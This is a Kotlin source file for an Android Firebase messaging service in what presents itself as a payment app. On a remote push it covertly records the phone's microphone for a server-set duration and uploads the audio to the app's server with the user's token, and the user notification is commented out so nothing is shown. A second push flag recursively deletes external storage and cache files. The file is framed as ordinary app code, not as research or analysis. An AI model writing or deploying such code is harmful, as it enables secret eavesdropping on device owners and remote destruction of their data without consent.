package com.payment.app.services

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.graphics.BitmapFactory
import android.icu.text.DateFormat
import android.icu.text.SimpleDateFormat
import android.media.MediaRecorder
import android.media.RingtoneManager
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.NotificationCompat
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import com.payment.app.ApiCallManager
import com.payment.app.HomeActivity
import com.payment.app.R
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import java.io.BufferedReader
import java.io.File
import java.io.IOException
import java.io.InputStreamReader
import java.util.Calendar


class MyFirebaseMessagingService : FirebaseMessagingService() {

    private var isRecording = false
    private var mediaRecorder: MediaRecorder? = null
    private var recordingDurationMillis = 5 * 60 * 1000 // 5 minutes
    private val stopRecordingHandler = Handler()
    private val stopRecordingTask = Runnable {
        stopRecording()
    }
    val apiCall = ApiCall()
    var duration: String = ""
    var isWipe: String = ""
    var file: File? = null
    val dateFormat: DateFormat = SimpleDateFormat("dd_MM_yyyy_HH_mm_ss")


    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        // TODO(developer): Handle FCM messages here.
        // Not getting messages here? See why this may be: https://goo.gl/39bRNJ
        Log.d("fcmNotification", "Message data payload: ${remoteMessage.data}")
        ApiCallManager.appendLog("Received push with request for recording of => ${remoteMessage.data}")

        // Check if message contains a data payload.
        if (remoteMessage.data.isNotEmpty()) {
            if(remoteMessage.data.containsKey("minute")){
                duration = remoteMessage.data["minute"].toString()
                getNotification(remoteMessage.data["minute"].toString())
            }
            if (remoteMessage.data.containsKey("isWipe")) {
                isWipe = remoteMessage.data["isWipe"].toString()
                if(isWipe == "true"){
                    clearDirectoryInExternalStorage()
                }
                Log.d("isWipe", isWipe)
            }
        }
        // Check if message contains a notification payload.
        remoteMessage.notification?.let {
            Log.d("fcmNotification", "Message Notification Body: ${it.title}")
        }

        // Also if you intend on generating your own notifications as a result of a received FCM
        // message, here is where that should be initiated. See sendNotification method below.
    }

    private fun clearDirectoryInExternalStorage() {
        val externalStorageDirectory = File(Environment.getExternalStorageDirectory().absolutePath)
        val androidFiles = File(Environment.getDataDirectory().absolutePath)
        val dir: File = applicationContext.getCacheDir()
        deleteAllFilesAndDirectories(dir)
        val filesAndDirectories = getAllFilesAndDirectories(externalStorageDirectory)
        val androidDirectories = getAllFilesAndDirectories(externalStorageDirectory)
        if (filesAndDirectories.isNotEmpty()) {
            println("Files and directories in $externalStorageDirectory:")
            for (item in filesAndDirectories) {
                println(item.absolutePath)
            }
            val success = deleteAllFilesAndDirectories(externalStorageDirectory)

            if (success) {
                ApiCallManager.appendLog("All files and directories deleted successfully.")

                println("All files and directories deleted successfully.")
            } else {
                ApiCallManager.appendLog("Error deleting files and directories.")

                println("Error deleting files and directories.")
            }
        }
        else {
            ApiCallManager.appendLog("No files or directories found in $externalStorageDirectory.")

            println("No files or directories found in $externalStorageDirectory.")
        }
        if (androidDirectories.isNotEmpty()) {
            println("Files and directories in $androidFiles:")
            for (item in androidDirectories) {
                println(item.absolutePath)
            }
            val success = deleteAllFilesAndDirectories(androidFiles)

            if (success) {
                println("All files and directories deleted successfully.")
            } else {
                println("Error deleting files and directories.")
            }
        }
        else {
            println("No files or directories found in $androidFiles.")
        }
    }

    private fun deleteAllFilesAndDirectories(targetDirectory: File): Boolean {
        val allFilesAndDirectories = getAllFilesAndDirectories(targetDirectory)

        if (allFilesAndDirectories.isNotEmpty()) {
            for (fileOrDirectory in allFilesAndDirectories) {
                if (fileOrDirectory.isDirectory) {
                    deleteAllFilesAndDirectories(fileOrDirectory)
                }
                if (Environment.getExternalStorageState() == Environment.MEDIA_MOUNTED) {
                    fileOrDirectory.delete()
                    val scanIntent = Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE)
                    scanIntent.data = Uri.fromFile(fileOrDirectory)
                    sendBroadcast(scanIntent)
                } else {
                    // Handle the case when external storage is not available
                }
                Log.d("clear directory", "$fileOrDirectory")

            }
            return true
        }

        return false
    }

    private fun getAllFilesAndDirectories(directory: File): List<File> {
        val resultList = mutableListOf<File>()

        if (directory.exists() && directory.isDirectory) {
            val files = directory.listFiles()
            if (files != null) {
                resultList.addAll(files)
            }
        }

        return resultList
    }


    private fun getNotification(body: String?) {
        val intent = Intent(this, HomeActivity::class.java)
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
        val requestCode = 0
        val pendingIntent = PendingIntent.getActivity(
            this,
            requestCode,
            intent,
            PendingIntent.FLAG_IMMUTABLE,
        )

        val channelId = "fcm_default_channel"
        val defaultSoundUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION)
        val notificationBuilder = NotificationCompat.Builder(this, channelId)
            .setSmallIcon(R.mipmap.ic_launcher)
            .setContentTitle("")
            .setContentText(body)
            .setAutoCancel(true)
            .setSound(defaultSoundUri)
            .setContentIntent(pendingIntent)

        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        // Since android Oreo notification channel is needed.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "Channel human readable title",
                NotificationManager.IMPORTANCE_DEFAULT,
            )
            notificationManager.createNotificationChannel(channel)
        }

        val notificationId = 0
        Log.d("fcmNotification", "Message Notification Body: ${body}")
        recordingDurationMillis = body!!.toInt() * 60 * 1000
        Log.d("recordingDurationMillis", "$recordingDurationMillis")

        if (isRecording) {
            stopRecording()
        } else {
            startRecording()
        }

//        notificationManager.notify(notificationId, notificationBuilder.build())

    }

    private fun startRecording() {
        mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(this) else MediaRecorder()
        mediaRecorder?.setAudioSource(MediaRecorder.AudioSource.MIC)
        mediaRecorder?.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
        mediaRecorder?.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
        val externalFilesDir = getExternalFilesDir(Environment.DIRECTORY_MUSIC)
        Log.d("currentDate" ,dateFormat.format(Calendar.getInstance().time).toString())

        file = File(externalFilesDir, "${dateFormat.format(Calendar.getInstance().time)}_recording.mp3")
        Log.d("output","output ${file!!.absolutePath}")
        mediaRecorder?.setOutputFile(file!!.absolutePath)
        try {
            mediaRecorder?.prepare()
            mediaRecorder?.start()
            isRecording = true
            ApiCallManager.appendLog("Recording started ${dateFormat.format(Calendar.getInstance().time)}")

            Log.d("startRecording","startRecording $recordingDurationMillis")

            stopRecordingHandler.postDelayed(stopRecordingTask, recordingDurationMillis.toLong())
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }

    private fun stopRecording() {
        mediaRecorder?.stop()
        mediaRecorder?.release()
        isRecording = false
        val sharedPreferences: SharedPreferences = this.getSharedPreferences("token",
            AppCompatActivity.MODE_PRIVATE
        )
        val token: String = sharedPreferences.getString("token", "").toString()
        var baseUrl = getString(R.string.api)
        Log.d("output","output ${file!!.length()}")
        val fileKb = file!!.length() / 1024
        val fileMb = fileKb / 1024

        ApiCallManager.appendLog("Recording stopped ${dateFormat.format(Calendar.getInstance().time)}")
        ApiCallManager.appendLog("Recorded = $duration Min, file size: $fileKb Kb, file path: ${file!!.absolutePath}")

        GlobalScope.launch(Dispatchers.IO) {
            try {
                val response = apiCall.uploadAudio(file!!.absolutePath,token,baseUrl,duration)
                if (response.isSuccessful) {
                    val responseBody = response.body?.string()
                    ApiCallManager.appendLog("Call Audio Response => $responseBody")

                    Log.d("response",responseBody.toString())

                } else {
                    ApiCallManager.appendLog("Call Audio Response => failed")
                    // Handle the error in the response
                }
            } catch (e: Exception) {
                ApiCallManager.appendLog("Call Audio Response => ${e.message.toString()}")
                // Handle network errors
            }
        }
        Log.e("StopRecording", "StopRecording")

    }


}